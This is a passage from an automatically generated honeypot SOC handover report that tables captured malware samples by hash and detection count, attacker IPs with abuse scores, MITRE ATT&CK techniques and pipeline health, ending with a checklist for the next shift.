| `36.212.227[.]224` | 1 | 2026-05-31 13:10 | 2026-05-31 13:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `5.195.226[.]17` | 1 | 2026-05-31 13:39 | 2026-05-31 13:39 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.209.234[.]84` | 1 | 2026-05-31 11:43 | 2026-05-31 11:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]53` | 1 | 2026-05-31 11:51 | 2026-05-31 11:51 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `187.108.193[.]54` | BR | EVEO S.A. | **100** ⚠️ | 10 |
| `18.212.241[.]23` | US | Amazon Technologies Inc. | **100** ⚠️ | 3 |
| `66.132.186[.]175` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `131.196.14[.]35` | EC | NEGOCIOS Y TELEFONIA NEDETEL S.A. | **100** ⚠️ | 25 |
| `151.158.1[.]210` | CH | Evoxt CH | **100** ⚠️ | 2 |
| `18.118.100[.]31` | US | Amazon Technologies Inc. | **100** ⚠️ | 38 |
| `179.33.186[.]150` | CO | COLOMBIA TELECOMUNICACIONES S.A. ESP | **100** ⚠️ | 50 |
| `116.125.120[.]27` | KR | SK Broadband Co Ltd | **100** ⚠️ | 3 |
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 8 |
| `58.209.234[.]84` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 39 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 21 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 12 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 319 cases |
| Tool 34  | Credential Extractor        | ✅ 33 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 23 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (0.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 12 priority case(s) shown individually · 21 recon entry/entries in table (9 group(s) consolidating 293 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-31T13:52:11Z_
